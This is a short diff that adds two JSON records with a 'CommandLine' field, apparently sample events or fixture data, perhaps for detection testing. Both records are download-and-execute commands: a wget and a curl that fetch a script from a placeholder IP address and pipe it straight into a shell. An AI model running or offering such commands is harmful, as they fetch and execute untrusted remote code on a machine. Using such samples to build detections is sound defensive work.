@@ -1,0 +1,2 @@
+{"CommandLine": "sh -c 'cd /tmp; wget http://203.0.113.99/x.sh -O- | sh'"}
+{"CommandLine": "curl -s http://198.51.100.9/m | bash"}
